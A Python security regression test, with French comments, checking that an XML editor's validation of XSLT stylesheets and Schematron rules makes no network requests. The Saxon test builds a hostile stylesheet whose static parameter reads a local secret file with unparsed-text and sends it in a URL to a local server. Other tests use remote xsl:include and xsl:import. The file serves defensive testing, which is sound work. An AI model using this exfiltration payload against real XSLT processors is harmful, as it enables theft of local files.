# -*- coding: utf-8 -*-
"""Red team (sécurité, B5) : vérifier une feuille XSLT ou des règles
Schematron affichées (sans les exécuter) ne consulte pas le réseau.

Saxon évalue à la compilation les paramètres statiques et ``use-when`` : une
feuille reçue pouvait y lire un fichier de l'ordinateur et l'envoyer dans
une adresse web, dès qu'elle était affichée. lxml chargeait un
``xsl:import`` distant, Saxon un ``xsl:include`` distant d'un fichier .sch.
Un serveur local compte les requêtes."""
from __future__ import annotations

import json
import subprocess
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest

from transform_worker import run_in_process
from xslt_scenarios import saxon_available

ROOT = Path(__file__).resolve().parents[1]
saxon = pytest.mark.skipif(not saxon_available(), reason="Saxon (saxonche) n'est pas installé")
EMPTY_XSLT = b'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"/>'


@pytest.fixture
def server():
    hits = []

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append(self.path)
            self.send_response(200)
            self.send_header("Content-Length", str(len(EMPTY_XSLT)))
            self.end_headers()
            self.wfile.write(EMPTY_XSLT)

        def log_message(self, *args):
            pass

    httpd = HTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    try:
        yield f"http://127.0.0.1:{httpd.server_address[1]}", hits
    finally:
        httpd.shutdown()


@saxon
def test_checking_an_xslt_3_stylesheet_reads_nothing_from_the_network(tmp_path, server):
    url, hits = server
    secret = tmp_path / "secret.txt"
    secret.write_text("SECRET", encoding="utf-8")
    leak = f"{url}/fuite?d=' || encode-for-uri(unparsed-text('{secret.as_uri()}')) || '"
    xslt = tmp_path / "recue.xsl"
    xslt.write_text('<xsl:stylesheet version="3.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
                    f'<xsl:param name="p" static="yes" select="doc-available(\'{leak}\')"/>'
                    f'<xsl:include href="{url}/inclus.xsl"/>'
                    '<xsl:template match="/"/></xsl:stylesheet>', encoding="utf-8")
    result = run_in_process({"op": "check", "engine": "saxon", "xslt": str(xslt), "text": xslt.read_text()},
                            timeout=120)
    assert hits == []
    assert not result.ok and "inclus.xsl" in result.error


def test_checking_an_xslt_1_stylesheet_reads_nothing_from_the_network(tmp_path, server):
    url, hits = server
    xslt = tmp_path / "recue.xsl"
    xslt.write_text('<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
                    f'<xsl:import href="{url}/importe.xsl"/></xsl:stylesheet>', encoding="utf-8")
    result = run_in_process({"op": "check", "engine": "lxml", "xslt": str(xslt), "text": xslt.read_text()},
                            timeout=120)
    assert hits == []
    assert not result.ok and result.error_code == "xslt_invalid" and "importe.xsl" in result.error


@saxon
def test_checking_schematron_rules_reads_nothing_from_the_network(tmp_path, server):
    url, hits = server
    rules = tmp_path / "recues.sch"
    rules.write_text('<sch:schema xmlns:sch="http://purl.oclc.org/dsdl/schematron" queryBinding="xslt2"'
                     ' xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
                     f'<xsl:include href="{url}/inclus.xsl"/>'
                     '<sch:pattern><sch:rule context="/"><sch:assert test="true()">x</sch:assert></sch:rule>'
                     '</sch:pattern></sch:schema>', encoding="utf-8")
    request = {"id": 1, "op": "check_schematron", "text": rules.read_text(), "path": str(rules)}
    completed = subprocess.run([sys.executable, str(ROOT / "relaxng_worker.py")], cwd=ROOT, timeout=120,
                               input=(json.dumps(request) + "\n").encode("utf-8"), capture_output=True)
    assert completed.stdout, completed.stderr[-2000:]
    assert hits == []
